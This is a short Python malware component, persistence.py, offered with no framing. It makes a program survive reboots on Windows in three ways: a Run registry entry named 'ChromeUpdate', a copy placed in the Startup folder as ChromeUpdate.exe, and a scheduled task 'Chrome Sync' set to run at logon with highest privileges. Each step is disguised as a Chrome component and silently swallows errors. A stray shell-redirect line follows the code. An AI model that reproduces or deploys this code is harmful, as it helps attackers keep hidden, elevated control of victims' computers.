
# persistence.py
import os
import sys
import shutil
import winreg

def reg_persist():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "ChromeUpdate", 0, winreg.REG_SZ, sys.executable)
        winreg.CloseKey(key)
    except: pass

def startup_copy():
    try:
        dst = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup", "ChromeUpdate.exe")
        if not os.path.exists(dst):
            shutil.copy(sys.executable, dst)
    except: pass

def task_persist():
    try:
        os.system(f'schtasks /create /tn "Chrome Sync" /tr "{sys.executable}" /sc onlogon /rl HIGHEST /f')
    except: pass

if __name__ == "__main__":
    reg_persist()
    startup_copy()
    task_persist()
# pyrefly: ignore [parse-error]
'> persistence.py